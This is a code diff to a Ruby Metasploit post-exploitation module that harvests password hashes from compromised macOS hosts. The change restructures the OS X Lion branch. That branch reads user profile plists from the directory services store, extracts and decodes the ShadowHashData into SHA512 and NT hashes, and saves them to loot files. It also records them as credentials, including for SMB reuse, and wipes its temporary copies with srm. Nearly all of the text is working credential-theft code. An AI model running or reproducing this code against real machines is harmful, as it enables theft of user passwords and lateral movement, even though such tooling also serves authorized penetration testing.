@@ -142,18 +142,93 @@ class Metasploit3 < Msf::Post
 		nt_hash = nil
 		host,port = session.tunnel_peer.split(':')
 		
-		users_folder = cmd_exec("/bin/ls","/Users")
-		
-		users_folder.each_line do |u|
-			next if u.chomp =~ /Shared|\.localized/
-			users << u.chomp
-		end
-
 		# Path to files with hashes
 		nt_file = ::File.join(log_folder,"nt_hash.txt")
 		lm_file = ::File.join(log_folder,"lm_hash.txt")
 		sha1_file = ::File.join(log_folder,"sha1_hash.txt")
 
+		# Check if system is Lion if not continue
+		if ver_num =~ /10\.(7)/
+
+			hash_decoded = ""
+
+			# get list of profiles present in the box
+			profiles = cmd_exec("ls /private/var/db/dslocal/nodes/Default/users").split("\n")
+
+			if profiles
+				profiles.each do |p|
+					# Skip none user profiles
+					next if p =~ /^_/
+					next if p =~ /^daemon|root|nobody/
+
+					# Turn profile plist in to XML format
+					cmd_exec("cp /private/var/db/dslocal/nodes/Default/users/#{p.chomp} /tmp/")
+					cmd_exec("plutil -convert xml1 /tmp/#{p.chomp}")
+					file = cmd_exec("cat /tmp/#{p.chomp}")
+
+					# Clean up using secure delete overwriting and zeroing blocks
+					cmd_exec("/usr/bin/srm -m -z /tmp/#{p.chomp}")
+
+					# Process XML Plist into a usable hash
+					plist_values = read_ds_xml_plist(file)
+
+					# Extract the shadow hash data, decode it and format it
+					plist_values['ShadowHashData'].join("").unpack('m')[0].each_byte do |b|
+						hash_decoded << sprintf("%02X", b)
+					end
+					user = plist_values['name']
+
+					# Check if NT HASH is present
+					if hash_decoded =~ /4F1010/
+						nt_hash = hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)
+					end
+
+					# Carve out the SHA512 Hash, the first 4 bytes is the salt
+					sha512 = hash_decoded.scan(/^\w*4F1044(\w*)(080B190|080D101E31)/)[0][0]
+
+					print_status("SHA512:#{user}:#{sha512}")
+					file_local_write(sha1_file,"#{user}:#{sha512}")
+					report_auth_info(
+						:host   => host,
+						:port   => 0,
+						:sname  => 'sha512',
+						:user   => user,
+						:pass   => sha512,
+						:active => false
+					)
+					# Reset hash value
+					sha512 = ""
+
+					if nt_hash
+						print_status("NT:#{user}:#{nt_hash}")
+						file_local_write(nt_file,"#{user}:#{nt_hash}")
+						report_auth_info(
+							:host   => host,
+							:port   => 445,
+							:sname  => 'smb',
+							:user   => user,
+							:pass   => nt_hash,
+							:active => true
+						)
+
+						# Reset hash value
+						nt_hash = nil
+					end
+					# Reset hash value
+					hash_decoded = ""
+				end
+			end
+
+			# If system was lion and it was processed nothing more to do
+			return
+		end
+
+		users_folder = cmd_exec("/bin/ls","/Users")
+
+		users_folder.each_line do |u|
+			next if u.chomp =~ /Shared|\.localized/
+			users << u.chomp
+		end
 		# Process each user
 		users.each do |user|
 			if ver_num =~ /10\.(6|5)/
@@ -164,78 +239,6 @@ class Metasploit3 < Msf::Post
 		
 				guid = cmd_exec("/usr/bin/niutil","-readprop . /users/#{user} generateduid").chomp
 				
-			elsif ver_num =~ /10\.(7)/
-
-				require 'rexml/document'
-				hash_decoded = ""
-
-				# get list of profiles present in the box
-				profiles = cmd_exec("ls /private/var/db/dslocal/nodes/Default/users").split("\n")
-
-				if profiles
-					profiles.each do |p|
-						# Skip none user profiles
-						next if p =~ /^_/
-						next if p =~ /^daemon|root|nobody/
-
-						# Turn profile plist in to XML format
-						cmd_exec("cp /private/var/db/dslocal/nodes/Default/users/#{p.chomp} /tmp/")
-						cmd_exec("plutil -convert xml1 /tmp/#{p.chomp}")
-						file = cmd_exec("cat /tmp/#{p.chomp}")
-
-						# Clean up using secure delete overwriting and zeroing blocks
-						cmd_exec("/usr/bin/srm -m -z /tmp/#{p.chomp}")
-						
-						# Process XML Plist into a usable hash
-						plist_values = read_ds_xml_plist(file)
-
-						# Extract the shadow hash data, decode it and format it
-						plist_values['ShadowHashData'].join("").unpack('m')[0].each_byte do |b|
-							hash_decoded << sprintf("%02X", b)
-						end
-						user = plist_values['name']
-
-						# Check if NT HASH is present
-						if hash_decoded =~ /4F1010/
-							nt_hash = hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)
-						end
-
-						# Carve out the SHA512 Hash, the first 4 bytes is the salt
-						sha512 = hash_decoded.scan(/^\w*4F1044(\w*)(080B190|080D101E31)/)[0][0]
-
-						print_status("SHA512:#{user}:#{sha512}")
-						file_local_write(sha1_file,"#{user}:#{sha512}")
-						report_auth_info(
-							:host   => host,
-							:port   => 0,
-							:sname  => 'sha512',
-							:user   => user,
-							:pass   => sha512,
-							:active => false
-						)
-						# Reset hash value
-							sha512 = ""
-
-						if nt_hash
-							print_status("NT:#{user}:#{nt_hash}")
-							file_local_write(nt_file,"#{user}:#{nt_hash}")
-							report_auth_info(
-								:host   => host,
-								:port   => 445,
-								:sname  => 'smb',
-								:user   => user,
-								:pass   => nt_hash,
-								:active => true
-							)
-							
-							# Reset hash value
-							nt_hash = nil
-						end
-						# Reset hash value
-						hash_decoded = ""
-					end
-				end
-				return
 			end
 
 			# Extract the hashes
